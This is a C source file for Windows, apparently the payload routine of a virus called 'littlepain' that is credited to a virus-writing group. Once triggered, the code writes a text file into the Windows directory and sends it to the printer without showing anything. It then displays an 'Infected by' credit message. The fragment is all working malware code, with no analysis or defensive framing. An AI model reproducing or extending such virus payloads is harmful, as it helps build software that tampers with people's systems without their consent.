#include "data_globals.h"
#include <windows.h>
#include <shellapi.h>
#include <string.h>

#pragma optimize("", off)
void _Payload(void)
{
    volatile struct _LocalCtx {
        CHAR flag_path[MAX_PATH];
        HANDLE flag_fd;
        DWORD written;
    } ctx;

    GetWindowsDirectoryA(ctx.flag_path, MAX_PATH);
    strcat(ctx.flag_path, "\\MSG_FOR_YOU.txt");

    ctx.flag_fd = CreateFileA(ctx.flag_path, GENERIC_WRITE, FILE_SHARE_WRITE,
                              NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (ctx.flag_fd != INVALID_HANDLE_VALUE)
    {
        WriteFile(ctx.flag_fd, "Dear user, your system needs some security improvements!",
                  56, &ctx.written, NULL);
        CloseHandle(ctx.flag_fd);
        ShellExecuteA(NULL, "print", ctx.flag_path, NULL, NULL, SW_HIDE);
        MessageBoxA(NULL, "Infected by littlepain by [WarGame,#eof] ( italian guy )", "Credits",
                    MB_OK | MB_ICONINFORMATION);
    }
}
#pragma optimize("", on)
